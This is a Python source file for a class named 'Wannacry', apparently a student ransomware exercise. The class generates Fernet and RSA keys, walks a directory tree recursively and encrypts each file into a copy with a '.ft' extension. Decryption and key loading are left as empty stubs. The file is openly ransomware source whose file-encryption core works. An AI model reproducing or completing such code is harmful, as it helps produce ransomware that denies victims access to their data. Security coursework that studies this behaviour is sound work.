import os

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPrivateKey, RSAPublicKey

from crypto import generate_symmetric_key, generate_private_key, generate_public_key
from logger import log_info, log_title


class Wannacry:
    fernet: Fernet
    private_key: RSAPrivateKey
    public_key: RSAPublicKey

    def __init__(self):
        print('STOCKHOLM_SYMMETRIC_KEY: ', os.environ.get('STOCKHOLM_SYMMETRIC_KEY'))
        if os.environ.get('STOCKHOLM_SYMMETRIC_KEY') and os.environ.get('STOCKHOLM_PUBLIC_KEY'):
            log_title('Loadin Key')
            self.__load_key__()
        else:
            log_title('Generating Key')
            self.__generate_key__()
    
    def encrypt(self, path: str):
        for root, dirs, files in os.walk(path, topdown=False):
            for name in files:
                filename = os.path.join(root, name)
                extension = os.path.splitext(filename)[1]
                if extension == '.ft':
                    continue
                self.encrypt_file(filename)

    def encrypt_file(self, filename: str):
        with open(filename, 'rb') as file:
            token = self.fernet.encrypt(file.read())
        new_filename = f'{filename}.ft'
        with open(new_filename, 'wb') as nf:
            nf.write(token)
        log_info(key="Encrypted:" , message=filename)

    def decrypt(self, path: str):
        pass
    
    def __load_key__(self):
        pass
    
    def __generate_key__(self):
        self.fernet = generate_symmetric_key()
        self.private_key = generate_private_key()
        self.public_key = generate_public_key(self.private_key)